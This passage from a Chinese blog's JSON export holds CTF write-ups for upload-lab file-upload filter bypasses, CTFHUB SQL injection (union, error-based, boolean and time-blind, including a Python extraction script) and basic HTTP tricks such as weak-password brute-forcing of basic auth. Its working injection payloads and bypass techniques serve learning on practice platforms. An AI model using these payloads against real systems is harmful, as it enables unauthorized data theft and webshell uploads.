$_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 我们发现，并没有删去后缀加”::$DATA”，我们先上传.php文件,再在后缀后加上”::$DATA” 上传成功！ pass10： $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 查看源码，我们使用后缀加”. .”的方法 上传成功","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"CTFHUB web之sql注入（一）","slug":"CTFwp/CTFHUB-web之sql注入（一）","date":"2025-04-05T16:00:00.000Z","updated":"2025-04-07T04:44:54.791Z","comments":true,"path":"2025/04/06/CTFwp/CTFHUB-web之sql注入（一）/","permalink":"http://example.com/2025/04/06/CTFwp/CTFHUB-web%E4%B9%8Bsql%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89/","excerpt":"","text":"这几天把sql注入最基础的一些给学了，用到了CTFHUB平台 1.整数型注入 拿到题目，打开网址，我们往输入框里输入1，显示如下，接下来我们输入 1&#x27;-- -1a&#x27; --1&quot; -- -1a&quot; -- -1 -- -1a -- - 我们发现，输入第五条时，回显存在，接下来我们以第五条为基础，编写我们的注入语句 我们查询的顺序依次是： DATABASE()——表名（table_name）——列名（column_name）——列中内容 首先我们使用order by语句 1 order by xxx -- - 我们注意到，order by语句后为1和2时存在回显，3则无回显，我们得知，接下来的联合查询union select语句 应该为 1 union select 1,2 -- - 输入后我们观察到 成功出现回显，将1改为-1接着我们逐步搜查表名，列名 库名： -1 union select 1,database() -- - 表名: -1 union select 1,table_name from information_schema.tables where table_schema = database() -- - 这里发现，只显示了其中一个表，为了显示出更多的表名，我们使用group_concat()函数，构造语句 -1 union select 1,group_concat(table_name) from information_schema.tables where table_schema = database() -- - 出现了第二个表名’flag’这个大概是我们需要的表 接下来是列名，我们构造语句 -1 union select 1,group_concat(column_name) from information_schema.columns where table_name = &#x27;flag&#x27; -- - 为了更严格，我们可以改为 -1 union select 1,group_concat(column_name) from information_schema.columns where table_schema = DATABASE() AND table_name = &#x27;flag&#x27; -- - 我们得到了列名，接下来可查询’flag’列中内容，我们构造语句 -1 union select 1,group_concat(flag) from flag -- - 成功得到flag：ctfhub{dcbabdd32219de44f1513c3b} 2.字符注入 与之前相同，我们先判断是否存在注入漏洞以及闭合方式 1&#x27;-- -1a&#x27; --1&quot; -- -1a&quot; -- -1 -- -1a -- - 接着我们来通过order by语句和union select语句 与上文的语句大致相同，我们可得到flag：ctfhub{0f30b333f2c779e2af8f9210} 3.报错注入 报错注入并不会直接返回信息，但还是存在回显的，我们可以通过构造语句，让报错的语句中出现我们想要得到的目标 这里我们使用extractvalue（）函数，concat（）函数，构造语句，得到结果 首先是查询库 1 and (select extractvalue(1,concat(0x7e,database()))) -- - 我们得到库名为’sqli’ 接下来构造语句查询表名 1 and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database())))) -- - 我们可得到表名’flag’，接下来我们可得到列名 1 and (select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name = &#x27;flag&#x27;)))) -- - 接下来我们查询列’flag’中内容：ctfhub{c69dd4ccce9c6c70d507b54a} 1 and (select extractvalue(1,concat(0x7e,(select group_concat(flag) from flag)))) -- - 4.布尔盲注 这里我们注意到，已经几乎没有回显了，没有返回信息，但还存在query_success，来提醒我们查询是否成功，接下来我们就逐步，一点点从库长度，库名，表个数，表名长度，表名，列个数，列名长度，列名，到最后我们得到内容，内容字节较多，我们使用py脚本就行爆破，得到flag 首先是库长度，我们构造语句 2 and length(database()) #后接&#x27;&gt;&#x27;，&#x27;=&#x27;,&#x27;&lt;&#x27;,采用二分法判断 我们查出这里database（）长度为4 接下来我们来构造语句查询库名 2 and left(database(),1)=&#x27;x&#x27;2 and left(database(),2)=&#x27;xx&#x27;2 and left(database(),3)=&#x27;xxx&#x27;2 and left(database(),4)=&#x27;xxxx&#x27; 我们最后可以得到，库名为’sqli’ 接下来我们判断表的情况 因为表可能存在多个，所以我们先构造语句判断表的个数 我们使用count（）函数， 2 and (select count(*) from information_schema.tables where table_schema = database()) &gt; 1 -- - 我们得到，表有两个，接下来我们分别判断这两个表的长度 1 and length(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)) =4 -- - 我们通过改变limit 后数来选择表 0,1 #第一张表1,1 #第二张表 接着我们来爆表名 1 and (select substr(table_name,1,4) from information_schema.tables where table_schema = database() limit 1,1) = &#x27;flag&#x27; 我们分别得到第一张表名为’news’,第二张表名为’flag’ 接着我们来爆列个数，列长度，列名 分别构造语句 2 and (select count(*) from information_schema.columns where table_name = &#x27;flag&#x27;) =x -- - 2 and length(substr((select column_name from information_schema.columns where table_name = &#x27;flag&#x27; limit 0,1),1)) = -- - 2 and (select substr(column_name,1,4) from information_schema.columns where table_name = &#x27;flag&#x27; limit 0,1) = &#x27;flag&#x27; -- - 我们得到了列名为’flag’ 最后我们来爆出最后的flag flag过长，我们采用脚本爆破 import requestsimport sysimport timesession = requests.session()url = &quot;http://challenge-517a9541cbbd039b.sandbox.ctfhub.com:10800/?id=&quot;flag = &quot;&quot;# 查询 flag 字段的值for i in range(1, 50): # 假设 flag 长度不超过 50 for j in range(32, 127): # 可打印 ASCII 范围 str_ascii = chr(j) payload = f&quot;if(substr((select flag from sqli.flag limit 0,1),&#123;i&#125;,1)=&#x27;&#123;str_ascii&#125;&#x27;,sleep(1),1)&quot; start_time = time.time() response = session.get(url + payload) end_time = time.time() t = end_time - start_time if t &gt; 1: # 如果延迟超过 1 秒，说明字符匹配 flag += str_ascii print(f&quot;[+] Current flag: &#123;flag&#125;&quot;) break else: # 如果内层循环未 break，说明字符不在 32-126 范围，可能是结束 print(&quot;[!] Reached end of flag or invalid character.&quot;) breakprint(f&quot;\\n[!] Final flag: &#123;flag&#125;&quot;) 我们得到最终flag：ctfhub{ae5e12c7977a8ff51ed577e8} 5.时间盲注 你的意思是？时间盲注，就是在布尔盲注的基础上，因为没有回显，用到sleep（）函数和if（）函数，选用bp半自动注入？以返回时间为判断是否成功？ 拿到题目，我们发现，真的是啥都不回，我们采用时间盲注 这里用到if(condition,A,B)函数和sleep()函数，在if()函数中，若condition成立，则执行A条件语句，否则执行B条件语句 那我们先试一下基础的判断 1 and if(2&gt;1,sleep(5),1) -- - 这里我们发现，网页在近5秒后，才出现页面更改 接着我们像布尔盲注那样，慢慢爆破出各项 1 and if(left(database(),1)=&#x27;x&#x27;,sleep(5),1) -- -1 and if(left(database(),2)=&#x27;xx&#x27;,sleep(5),1) -- -1 and if(left(database(),3)=&#x27;xxx&#x27;,sleep(5),1) -- -1 and if(left(database(),4)=&#x27;xxxx&#x27;,sleep(5),1) -- - 我们成功得到库名’sqli’ 接下来是爆出表个数，表长度，表名 2 and if((select count(*) from information_schema.tables where table_schema = database()) =x ,sleep(5),1)-- - 2 and if (length(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)) =4,sleep(5),1) -- - 2 and if((select substr(table_name,1,4) from information_schema.tables where table_schema = database() limit 1,1) = &#x27;flag&#x27;,sleep(5),1) -- - 我们成功得到了存在两张表，第二张表长度为4，表名为’flag’ 接下来是对列的个数，列长度，列名爆破 2 and if((select count(*) from information_schema.columns where table_name = &#x27;flag&#x27;) =x,sleep(5),1) -- - 2 and if(length(substr((select column_name from information_schema.columns where table_name = &#x27;flag&#x27; limit 0,1),1)) =4,sleep(5),1) -- - 2 and if((select substr(column_name,1,4) from information_schema.columns where table_name = &#x27;flag&#x27; limit 0,1) = &#x27;flag&#x27;,sleep(5),1) -- - 我们成功得到了列有1个，列长度为4，列名为’flag’ 我们借助脚本爆破出flag：ctfhub{3ddf5af78cc199cfe0536dd5} 展示成果： 彩蛋： 想要成为MUSE高手。。。","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"开端","slug":"开端","date":"2025-04-05T06:33:19.749Z","updated":"2025-04-05T06:32:14.844Z","comments":true,"path":"2025/04/05/开端/","permalink":"http://example.com/2025/04/05/%E5%BC%80%E7%AB%AF/","excerpt":"","text":"Creat river in the desert！","categories":[],"tags":[{"name":"发癫","slug":"发癫","permalink":"http://example.com/tags/%E5%8F%91%E7%99%AB/"}]},{"title":"CTFHUB web前置技能","slug":"CTFwp/CTFHUB web前置技能","date":"2025-04-01T16:00:00.000Z","updated":"2025-04-07T04:49:27.867Z","comments":true,"path":"2025/04/02/CTFwp/CTFHUB web前置技能/","permalink":"http://example.com/2025/04/02/CTFwp/CTFHUB%20web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD/","excerpt":"","text":"CTFHUB web前置技能 HTTP协议： 1.请求方式： 翻译：HTTP Method 为 GET 使用 CTF**B 方法，我会给你标记。 提示： 如果你收到 “HTTP Method Not Allowed” 错误，你应该请求 index.php。 使用bp拦截，将GET请求改为题目中的CTFHUB，再次发送，得到flag ctfhub{02778be697ad5008bfe9ae63} 302跳转： 点击”give me flag“，发现无事发生，F12查看，发现状态302 用bp拦截到index.php文件的请求，发送到repeater，尝试再次发送，得到flag ctfhub{2fe8353641d31d1558f9daa9} 3.cookie 打开网页发现 发现有： Cookie: admin=0 发送到repeater，将0改为1，再次发送，得到flag ctfhub{a7948d76c6736defe3023c77} 4.基础认证 进入网页后，点击click，显示让我们输入用户与密码 随便输入用户与密码 在bp拦截看到 Authorization: Basic YXNkYXNkOmFzZGFzZA&#x3D;&#x3D; 一段base64编码，翻译后得到 asdasd:asdasd 我们尝试输入的账号与密码，中间使用‘：‘间隔， 发送到repeater查看响应 有一条 WWW-Authenticate: Basic realm=&quot;Do u know admin ?&quot; 我们尝试使用admin为账户名，以：为间隔，使用弱口令爆破 发送到bp的intruder，使用sniper攻击 GET /flag.html HTTP/1.1Host: challenge-8a31bab7ddbc3de3.sandbox.ctfhub.com:10800User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflate, brConnection: keep-aliveReferer: http://challenge-8a31bab7ddbc3de3.sandbox.ctfhub.com:10800/Upgrade-Insecure-Requests: 1Priority: u=0, iAuthorization: Basic YWRtaW46YWRtaW4= 将“YWRtaW46YWRtaW4&#x3D;”设为ayload位置，添加“admin:”为前缀，base64编码的条件，开始弱口令爆破 记得去掉URL编码字符 成功找到YWRtaW46MTIzNDU2 解码后得到admin:123456，输入后得到flag ctfhub{6e8d7b074034d888aefae96f} 5.响应包源代码 打开后发现是一个贪吃蛇小游戏 F12查看元素，得到flag ctfhub{ada8033f6296d9108c1623e9} 展示成果","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]}],"categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"发癫","slug":"发癫","permalink":"http://example.com/tags/%E5%8F%91%E7%99%AB/"}]}